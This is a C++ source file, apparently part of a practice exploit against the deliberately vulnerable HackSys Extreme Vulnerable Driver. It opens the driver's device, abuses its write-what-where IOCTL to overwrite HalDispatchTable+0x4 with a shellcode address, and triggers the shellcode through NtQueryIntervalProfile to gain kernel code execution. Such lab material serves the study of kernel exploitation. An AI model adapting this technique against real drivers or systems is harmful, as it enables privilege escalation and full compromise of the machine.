#include "exploit.h"

HANDLE hDevice = NULL;

/*
* initWriteWhatWhereEnvironment:
*	[+] 初始化write-what-where的漏洞环境
* 返回值:
*	[+] True: 初始化失败
*	[+] False: 初始化成功
*/
BOOL initWriteWhatWhereEnvironment()
{
	BOOL bReturn = FALSE;
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "[+] HEVD not exist" << std::endl;
	}
	else
	{
		std::cout << "[+] Keep Go Go Go" << std::endl;
		bReturn = TRUE;
	}

	return bReturn;
}


/*
* write_what_where_dword:
*	[+] 对任意地址任意大小的dword数据
*	[+] whereWrite: 写入的地址
*	[+] whatWirte: 写入的值
*/
VOID write_what_where_dword(DWORD32 whereWrite, DWORD32 whatWrite)
{
	WRITE_WHAT_WHERE exploitStruct = {};
	DWORD lpBytesReturned = 0;
	exploitStruct.Where = (PVOID)whereWrite;
	exploitStruct.What = (PVOID)&whatWrite;

	std::cout << "[+] write at: " << std::hex << whereWrite << std::endl;
	std::cout << "[+] write with: " << std::hex << whatWrite << std::endl;

	DeviceIoControl(hDevice, WIRTE_WHAT_WHERE_IO_NUMBER, &exploitStruct, 0x8, NULL, 0, &lpBytesReturned, NULL);
}

VOID runShellCode()
{
	DWORD interVal = 0;
	// find haldispatchtable+0x4 and replace it
	DWORD32 halHooked = getHalDispatchOffset4();
	std::cout << "[+] haldispatchtable offset 4 at: " << std::hex <<  halHooked << std::endl;
	write_what_where_dword(halHooked, (DWORD32)&shellCode);
	// 获取基地址

	// 执行shellcode
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");

	NtQueryIntervalProfile(0x1234, &interVal);
}